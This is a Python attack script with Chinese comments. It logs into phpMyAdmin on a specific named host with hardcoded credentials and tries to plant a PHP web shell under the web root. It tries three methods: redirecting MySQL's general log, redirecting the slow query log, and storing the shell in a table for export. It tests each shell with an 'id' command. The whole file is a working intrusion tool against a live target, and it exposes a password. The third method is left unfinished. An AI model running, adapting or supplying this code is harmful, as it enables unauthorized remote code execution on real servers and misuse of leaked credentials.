#!/usr/bin/env python3
import requests
import re
import time
urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print("[*] 方法1: 通过general_log写入shell...")

# 查找可写目录
log_paths = [
    "/var/www/html/banpot/scmeeting/shell.php",
    "/var/www/html/shell.php",
    "/var/www/banpot/scmeeting/shell.php",
]

for log_path in log_paths:
    print(f"[*] 尝试: {log_path}")
    
    # 设置日志文件路径
    sql1 = f"SET GLOBAL general_log_file = '{log_path}';"
    sql_data = {"sql_query": sql1, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)
    
    # 开启日志
    sql2 = "SET GLOBAL general_log = 'ON';"
    sql_data = {"sql_query": sql2, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)
    
    # 执行SELECT语句，内容会被写入日志
    shell_code = "<?php system($_GET['c']); ?>"
    sql3 = f"SELECT '{shell_code}';"
    sql_data = {"sql_query": sql3, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)
    
    # 关闭日志
    sql4 = "SET GLOBAL general_log = 'OFF';"
    sql_data = {"sql_query": sql4, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)
    
    time.sleep(1)
    
    # 测试shell
    http_path = log_path.replace("/var/www/html", "").replace("/var/www", "")
    test_url = f"https://olympic.su.ac.th{http_path}?c=id"
    resp2 = requests.get(test_url, verify=False, timeout=5)
    
    if "uid=" in resp2.text or "gid=" in resp2.text:
        print(f"[+] Shell获取成功: {test_url}")
        print(f"[+] 测试: {test_url}")
        exit(0)
    elif '<?php' not in resp2.text and resp2.status_code == 200:
        print(f"[+] 可能成功，响应: {resp2.text[:100]}")

print("[*] 方法2: 通过慢查询日志...")
# 慢查询日志方法
for log_path in log_paths:
    sql1 = f"SET GLOBAL slow_query_log_file = '{log_path}';"
    sql_data = {"sql_query": sql1, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)
    
    sql2 = "SET GLOBAL slow_query_log = 'ON';"
    sql_data = {"sql_query": sql2, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)
    
    sql3 = f"SELECT '{shell_code}' FROM mysql.user WHERE sleep(1);"
    sql_data = {"sql_query": sql3, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)
    
    sql4 = "SET GLOBAL slow_query_log = 'OFF';"
    sql_data = {"sql_query": sql4, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)
    
    time.sleep(2)
    http_path = log_path.replace("/var/www/html", "").replace("/var/www", "")
    test_url = f"https://olympic.su.ac.th{http_path}?c=id"
    resp2 = requests.get(test_url, verify=False, timeout=5)
    
    if "uid=" in resp2.text:
        print(f"[+] Shell获取成功(慢查询): {test_url}")
        exit(0)

print("[*] 方法3: 通过数据库表存储，然后导出...")
# 创建表存储shell代码
sql_create = "CREATE TABLE IF NOT EXISTS scmeeting.shell(code TEXT);"
sql_data = {"sql_query": sql_create, "db": "scmeeting"}
session.post(url + "db_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data)

sql_insert = "INSERT INTO scmeeting.shell VALUES('<?php system($_GET[\"c\"]); ?>');"
sql_data = {"sql_query": sql_insert, "db": "scmeeting"}
session.post(url + "db_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data)

# 尝试导出
export_data = {
    "export_type": "sql",
    "what": "sql",
    "sql_query": "SELECT code FROM scmeeting.shell;",
    "sql_delimiter": ";",
    "sql_export_file": "/var/www/html/banpot/scmeeting/shell.php",
}

# 或者通过phpMyAdmin的导出功能
print("[*] 检查导出功能...")

print("[-] 所有方法尝试完毕")
